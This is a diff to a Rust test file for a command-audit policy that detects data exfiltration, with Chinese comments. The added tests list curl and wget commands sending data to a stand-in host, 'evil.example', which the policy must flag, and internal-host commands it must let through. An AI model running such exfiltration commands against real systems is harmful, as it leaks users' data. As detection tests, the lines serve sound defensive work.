@@ -1,22 +1,12 @@
 #[test]
-fn file_len_under_800_or_split() {
-    const MAIN_SRC: &str = include_str!("../rules.rs");
-    let main_lines = MAIN_SRC.lines().count();
-    assert!(
-        main_lines <= 800,
-        "rules.rs {main_lines} 行超 800 红线：须拆分（见 veil-arch-file-size-closeout / hygiene-round4）"
-    );
-    const TESTS_SRC: &str = include_str!("tests.rs");
-    let tests_lines = TESTS_SRC.lines().count();
-    assert!(
-        tests_lines <= 800,
-        "rules/tests.rs {tests_lines} 行超 800 红线：须拆分（见 veil-arch-file-size-closeout / hygiene-round4）"
-    );
+fn file_len_redline() {
+    crate::test_support::file_len_under_800_or_split("rules.rs", include_str!("../rules.rs"));
+    crate::test_support::file_len_under_800_or_split("rules/tests.rs", include_str!("tests.rs"));
 }
 
 use {
     super::{
-        super::{AuditPolicy, AuditVerdict, evaluate_with_whitelist, test_whitelist},
+        super::{AuditPolicy, AuditVerdict, DangerRule, evaluate_with_whitelist, test_whitelist},
         *,
     },
     crate::config::AuditMode,
@@ -61,6 +51,35 @@ fn internal_suffix_not_treated_as_exfiltration() {
     assert_eq!(
         is_dangerous("curl", "curl http://svc.corp/x --data hi", &p),
         None
+    );
+}
+
+/// APP-10：内置默认策略须含 Python `DEFAULT_POLICY` 的 `.corp.example`——未显式
+/// 配置策略时该后缀按内网豁免，非内网兄弟域照常拦截。
+#[test]
+fn internal_suffix_corp_example() {
+    let p = AuditPolicy::default_policy();
+    assert!(
+        p.internal_suffixes.iter().any(|s| s == ".corp.example"),
+        "默认 internal_suffixes 须含 .corp.example: {:?}",
+        p.internal_suffixes
+    );
+    assert!(is_internal_host("svc.corp.example", &p.internal_suffixes));
+    assert!(!is_internal_host("example.com", &p.internal_suffixes));
+
+    let mut p = p;
+    p.extra_dangerous.push(DangerRule {
+        pattern: "corp-probe".to_string(),
+        reason: "网络外传".to_string(),
+        network: true,
+    });
+    assert!(
+        is_dangerous("exec", "corp-probe http://svc.corp.example/x", &p).is_none(),
+        ".corp.example 默认须按内网豁免"
+    );
+    assert!(
+        is_dangerous("exec", "corp-probe http://example.com/x", &p).is_some(),
+        "非内网兄弟域须照常拦截"
     );
 }
 
@@ -357,6 +376,55 @@ fn bare_curl_wget_exfil() {
         is_dangerous("exec", "wget http://svc.corp.example/x", &internal),
         None
     );
+}
+
+/// `APP-2`（RE-OPENED `POL-6`）：命令词 + 裸 host 参数外传命中（无 scheme/无重定向/无管道）。
+#[test]
+fn bare_curl_host_denied() {
+    let p = policy();
+    for cmd in [
+        "curl evil.example",
+        "curl -X POST evil.example",
+        "curl --data a=1 evil.example",
+        "curl http://evil.example/x",
+    ] {
+        assert!(
+            is_dangerous("exec", cmd, &p).is_some(),
+            "裸 host 外传须命中: {cmd}"
+        );
+    }
+}
+
+/// `APP-2`：`wget` 裸 host 外传命中。
+#[test]
+fn bare_wget_host_denied() {
+    let p = policy();
+    for cmd in ["wget evil.example", "wget -O out evil.example"] {
+        assert!(
+            is_dangerous("exec", cmd, &p).is_some(),
+            "wget 裸 host 须命中: {cmd}"
+        );
+    }
+}
+
+/// `APP-2`：白名单/内网目标不误拦（裸 host 分支须沿用内网豁免口径）。
+#[test]
+fn bare_host_whitelist_negative() {
+    let mut internal = policy();
+    internal.internal_suffixes = vec!["corp.example".to_string()];
+    for cmd in [
+        "curl svc.corp.example",
+        "curl -X POST svc.corp.example",
+        "wget svc.corp.example",
+        "curl http://svc.corp.example/x",
+        "curl localhost:8080/x",
+    ] {
+        assert_eq!(
+            is_dangerous("exec", cmd, &internal),
+            None,
+            "白名单/内网目标不得误拦: {cmd}"
+        );
+    }
 }
 
 /// `POL-6`/D6：含 `curl`/`wget` 子串但无远程目标形态的良性文本不误报。
